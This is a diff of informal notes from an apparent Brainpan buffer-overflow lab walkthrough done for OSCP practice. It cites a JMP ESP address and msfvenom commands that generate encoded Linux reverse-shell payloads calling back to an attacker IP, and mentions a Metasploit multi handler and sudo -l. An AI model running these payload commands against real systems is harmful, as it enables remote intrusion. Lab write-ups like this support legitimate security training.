@@ -24,16 +24,18 @@ whoop! we go the address --  311712F3   . FFE4           JMP ESP
 
 use these exploits 
 
-#msfvenom -p linux/shell_reverse_tcp LHOST=your.Kali.IP.address LPORT=4444 EXITFUNC=thread -f c -a x86 –platform linux -b “\x00”
+
 #msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.31.148 LPORT=1337 -f c -a x86 --platform linux -b "\x00" -e x86/shikata_ga_nai
-#msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.31.148 LPORT=4444 EXITFUNC=thread –e x86/alpha_upper –b “\x00” -f c
 
 
-you got  a kali shell perfect 
+you got  a kali shell perfect  coz i am running the downloaded exe in my kali . now its time to execute it on the actual target 
 
 now change the address of breainpain machine as 192.168.31.149
 
-send you got a shell but not first time with nc so try multi handler 
+send you got a shell but not first time with nc 
+
+so try multi handler 
+( protip : -- its allowed in OSCP if you are in fear not to use only meterperter is used at once -- other wise multihandler , msfvenom , auxilary you can use,also scripts )
 
 
 type sudo -l 
